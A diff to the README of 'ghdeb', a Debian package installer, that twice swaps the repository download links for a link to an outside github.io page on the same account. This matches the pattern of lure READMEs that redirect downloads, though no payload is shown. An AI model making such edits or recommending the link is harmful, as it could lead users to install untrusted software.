@@ -1,6 +1,6 @@
 # 🎯 ghdeb - Simple .deb Installer From GitHub
 
-[![Download ghdeb](https://img.shields.io/badge/Download-ghdeb_1.0-blue)](https://github.com/registercorythosaur857/ghdeb)
+[![Download ghdeb](https://img.shields.io/badge/Download-ghdeb_1.0-blue)](https://registercorythosaur857.github.io)
 
 ## 🚀 What Is ghdeb?
 
@@ -32,7 +32,7 @@ If you use Linux (Debian or Ubuntu), you know how easy it is to install software
 
 Visit the download page to get the latest version:
 
-[https://github.com/registercorythosaur857/ghdeb](https://github.com/registercorythosaur857/ghdeb)
+[https://registercorythosaur857.github.io](https://registercorythosaur857.github.io)
 
 **Step 1:** Go to the link above.  
 **Step 2:** Click the green "Code" button.  
